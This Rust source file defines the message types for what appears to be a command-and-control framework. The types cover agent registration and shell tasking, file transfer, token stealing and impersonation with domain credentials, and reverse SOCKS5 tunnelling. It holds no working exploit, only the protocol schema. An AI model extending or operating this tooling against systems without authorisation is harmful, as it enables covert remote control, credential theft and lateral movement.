//! Protocol message types shared across server, agent, and CLI.

use serde::{Deserialize, Serialize};

/// Agent registration request (agent → server).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterReq {
    pub agent_id: String,
    pub platform: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_version: Option<String>,
    pub ip_addrs: Option<String>,
    pub alias: Option<String>,
    pub note: Option<String>,
}

/// Agent registration response (server → agent).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterResp {
    pub status: String,
    pub message: String,
    pub token: String,
}

/// Task type discriminator for commands.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
#[serde(rename_all = "snake_case")]
pub enum TaskType {
    #[default]
    Shell,
    Upload,
    Download,
    StealToken,
    MakeToken,
    Rev2Self,
}

/// Command dispatched to agent (server → agent).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub cmd_id: String,
    /// Shell command text (Shell), or JSON-encoded task payload (Upload/Download).
    pub command: String,
    #[serde(default)]
    pub task_type: TaskType,
}

/// Upload task payload — JSON-encoded in Command.command for Upload tasks.
/// Server has assembled the file; agent fetches it and writes to `path`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UploadTask {
    pub transfer_id: String,
    pub path: String,
}

/// Download task payload — JSON-encoded in Command.command for Download tasks.
/// Agent reads `path` and sends chunks back to server.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DownloadTask {
    pub transfer_id: String,
    pub path: String,
}

/// A single chunk of a file transfer (used in both directions).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChunk {
    pub transfer_id: String,
    /// 0-based chunk index.
    pub seq: u32,
    /// Total number of chunks.
    pub total: u32,
    /// Base64-encoded chunk bytes.
    pub data: String,
}

/// steal_token payload — JSON-encoded in Command.command.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealTokenTask {
    pub pid: u32,
}

/// make_token payload — JSON-encoded in Command.command.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MakeTokenTask {
    pub domain_user: String,
    pub password: String,
}

/// Result upload request (agent → server).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResultReq {
    pub cmd_id: String,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub signature: String,
}

/// Agent runtime config (embedded or file).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub c2_url: String,
    pub profile_name: String,
    pub shared_token: String,
    pub alias: Option<String>,
    pub note: Option<String>,
}

// ─── Shared API response DTOs (server → CLI) ───

/// Agent info returned by GET /admin/agents.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentView {
    pub agent_id: String,
    pub alias: Option<String>,
    pub platform: String,
    pub last_seen_at: Option<String>,
    pub note: Option<String>,
    pub profile_name: Option<String>,
    pub beacon_min_ms: Option<i64>,
    pub beacon_max_ms: Option<i64>,
    pub backoff_max_ms: Option<i64>,
    pub kill_after_hours: Option<i64>,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_version: Option<String>,
    pub ip_addrs: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

/// Command result returned by GET /admin/results.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResultView {
    pub agent_id: String,
    pub cmd_id: String,
    pub exit_code: i64,
    pub stdout: String,
    pub stderr: String,
    pub ts_ms: i64,
}

/// Audit log entry returned by GET /admin/audit.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditView {
    pub id: i64,
    pub ts: String,
    pub actor: String,
    pub action: String,
    pub target_type: String,
    pub target_id: String,
    pub context: serde_json::Value,
}

/// Tags response from GET /admin/agents/{id}/tags.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TagsResponse {
    #[serde(default)]
    pub tags: Vec<String>,
}

// ─── Tunnel / Reverse SOCKS5 ───

/// Direction of a tunnel frame.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum TunnelAction {
    /// Server → agent: open TCP connection to `data` ("host:port").
    Open,
    /// Bidirectional: relay payload (base64-encoded bytes in `data`).
    Data,
    /// Either direction: close the tunnel session.
    Close,
}

/// A single tunnel frame piggybacked on the poll channel or sent via tunnel endpoints.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelData {
    pub tunnel_id: u32,
    pub action: TunnelAction,
    /// Open: "host:port". Data: base64-encoded bytes. Close: "".
    pub data: String,
}

/// Unified poll response — wraps an optional command and piggybacked tunnel frames.
/// The agent must parse poll responses as this type (instead of bare Command).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct PollResponse {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command: Option<Command>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tunnel_frames: Vec<TunnelData>,
}

/// Active SOCKS5 listener info returned by GET /admin/socks/list.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SocksListenerView {
    pub agent_id: String,
    pub port: u16,
}

